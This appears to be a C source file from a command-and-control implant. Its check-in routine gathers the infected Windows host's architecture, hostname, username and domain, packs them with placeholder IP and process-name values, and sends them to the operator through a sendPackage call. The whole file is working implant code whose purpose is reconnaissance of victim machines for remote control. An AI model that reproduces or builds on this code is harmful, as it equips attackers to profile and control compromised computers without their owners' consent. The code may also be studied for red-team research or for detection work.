#include "Checkin.h"


BYTE getArch()
{
	SYSTEM_INFO systemInfo;
	GetNativeSystemInfo(&systemInfo);
	if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64
		|| systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
	{
		return 0x64;
	}

	return 0x86;
}


PCHAR getHostname()
{
	LPSTR data = NULL;
	DWORD dataLen = 0;
	const char* hostnameRep = "N/A";
	if (!GetComputerNameExA(ComputerNameNetBIOS, NULL, &dataLen))
	{
		if (data = (LPSTR)LocalAlloc(LPTR, dataLen))
		{
			memset((PBYTE)data, 0, dataLen);
			GetComputerNameExA(ComputerNameNetBIOS, data, &dataLen);
			hostnameRep = data;
		}
	}
	return (char*)hostnameRep;
}

char* getUserName()
{
	LPSTR data = NULL;
	DWORD dataLen = 0;
	const char* userName = "N/A";
	if (!GetUserNameA(NULL, &dataLen))
	{
		if (data = (LPSTR)LocalAlloc(LPTR, dataLen))
		{
			memset(data, 0, dataLen);
			GetUserNameA(data, &dataLen);
			userName = data;
		}
	}
	return (char*)userName;
}

LPWSTR getDomain()
{
	DWORD dwLevel = 102;
	LPWKSTA_INFO_102 pBuf = NULL;
	NET_API_STATUS nStatus;
	LPWSTR pszServerName = NULL;
	LPWSTR domain = NULL;
	nStatus = NetWkstaGetInfo(pszServerName, dwLevel, (LPBYTE*)&pBuf);
	if (nStatus == NERR_Success)
	{
		domain = pBuf->wki102_langroup;
	}
	/*if (pBuf != NULL)
		NetApiBufferFree(pBuf);*/
	return domain;
}

char* getOsName()
{
#pragma warning(disable : 4996)
	return (PCHAR)"Windows";
}

BOOL checkin()
{
	PPackage checkin = newPackage(0, FALSE);
	addString(checkin, (PCHAR)uuid, FALSE);
	//addInt32(checkin, 1);
	addString(checkin, (PCHAR)"192.168.50.1", TRUE);
	
	addString(checkin, getOsName(), TRUE);
	addByte(checkin, getArch());
	addString(checkin, getHostname(), TRUE);
	addString(checkin, getUserName(), TRUE);
	addWString(checkin, getDomain(), TRUE);
	addInt32(checkin, 0);
	addString(checkin, (PCHAR)"Test.exe", TRUE);
	addString(checkin, (PCHAR)"1.1.1.1", TRUE);

	Parser* ResponseParser = sendPackage(checkin);

	freePackage(checkin);

	if (!ResponseParser)
		return FALSE;

	
	return TRUE;
}
